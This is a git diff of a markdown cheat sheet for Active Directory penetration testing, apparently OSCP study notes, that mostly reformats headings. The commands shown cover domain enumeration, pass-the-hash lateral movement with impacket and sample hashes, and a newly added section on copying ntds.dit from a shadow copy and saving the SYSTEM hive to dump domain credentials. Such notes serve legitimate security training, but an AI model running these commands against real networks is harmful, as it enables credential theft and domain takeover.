@@ -24,17 +24,17 @@ impacket-GetADUsers domain.com -dc-ip $rhost -debug
 
 If you have only users, you should try **AS-REP Roasting**.
 
-Enumerate Local Accounts on the machine:
+#### Enumerate Local Accounts on the machine:
 ```
 net user /domain
 ```
 
-Checking admin account:
+#### Checking admin account:
 ```
 net user admin /domain
 ```
 
-Enumerate roups:
+#### Enumerate roups:
 ```
 net group /domain
 ```
@@ -46,38 +46,38 @@ net group "Sales Department" /domain
 
 ### Operating System
 
-PowerView:
+#### PowerView:
 ```
 Get-NetComputer
 ```
 
 ### Permissions and Logged on Users
 
-PowerView:
+#### PowerView:
 ```
 Find-LocalAdminAccess
 ```
 
-PowerView:
+#### PowerView:
 ```
 Get-NetSession -ComputerName computer_name -Verbose
 ```
 
 ### Enumeration Through Service Principal Names
 
-cmd:
+#### cmd:
 ```
 setspn -L user
 ```
 
-powershell:
+#### PowerView:
 ```
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
 ```
 
 ### Enumerating Object Permissions
 
-Permissions:
+#### Permissions:
 ```
 GenericAll: Full permissions on object
 GenericWrite: Edit certain attributes on the object
@@ -88,14 +88,14 @@ ForceChangePassword: Password change for object
 Self (Self-Membership): Add ourselves to for example a group
 ```
 
-PowerView:
+#### PowerView:
 ```
 Get-ObjectAcl -Identity douglas
 ```
 
 ### Enumerating Domain Shares
 
-PowerView:
+#### PowerView:
 ```
 Find-DomainShare
 ```
@@ -123,12 +123,12 @@ Invoke-BloodHound -CollectionMethod All
 
 ##### Raw Queries
 
-Return Computers:
+###### Return Computers:
 ```
 MATCH (m:Computer) RETURN m
 ```
 
-Return Users:
+###### Return Users:
 ```
 MATCH (m:User) RETURN m
 ```
@@ -243,12 +243,12 @@ impacket-psexec test.local/john:password123@10.10.10.1
 
 ### Impacket:
 
-WMI:
+#### WMI:
 ```
 impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@$rhost
 ```
 
-PsExec:
+#### PsExec:
 ```
 impacket-psexec oscp.exam/administrator@192.168.130.102 -hashes :ba85f4e1f47633ebd44894de679fabb4
 
@@ -262,4 +262,23 @@ impacket-psexec oscp.exam/administrator@192.168.130.102 -hashes :ba85f4e1f47633e
 
 ## Golden Ticket
 
+
+
 ## Shadow Ticket
+
+Take a snapshot of drive C: :
+```
+vshadow.exe -nw -p  C:
+```
+
+Copy whe whole AD database:
+```
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+```
+
+Extract the content of ntds.dit and save the SYSTEM hive:
+```
+reg.exe save hklm\system c:\system.bak
+```
+
+Now use secretsdump
